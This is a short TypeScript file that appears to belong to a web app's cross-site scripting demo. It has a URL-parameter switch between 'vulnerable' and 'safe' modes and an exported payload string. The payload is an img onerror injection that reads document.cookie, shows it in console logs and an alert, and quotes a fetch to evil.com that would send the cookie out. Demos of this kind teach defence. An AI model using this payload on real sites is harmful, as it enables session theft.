export type XSSDemoMode = "vulnerable" | "safe" | "off";

export function getXSSDemoMode(): XSSDemoMode {
  if (typeof window === "undefined") return "off";

  const param = new URLSearchParams(window.location.search).get("xssDemo");
  if (!param) return "off";

  const value = param.trim().toLowerCase();

  if (value === "vulnerable") return "vulnerable";
  if (value === "safe") return "safe";

  return "off";
}

export const MALICIOUS_PAYLOAD = `Fix the bug<img src=x onerror="
    console.error('🚨 XSS ATTACK EXECUTED!');
    console.error('💀 Stolen data: cookie=' + document.cookie);
    console.error('🌐 In a real attack, this would send to:');
    console.error('   fetch(\\'https://evil.com/steal?cookie=\\' + document.cookie)');
    alert('🚨 XSS ATTACK SUCCESSFUL!\\n\\nCookie: ' + document.cookie + '\\n\\nIn a real attack, this would be sent to the attacker\\'s server!');
  ">`;
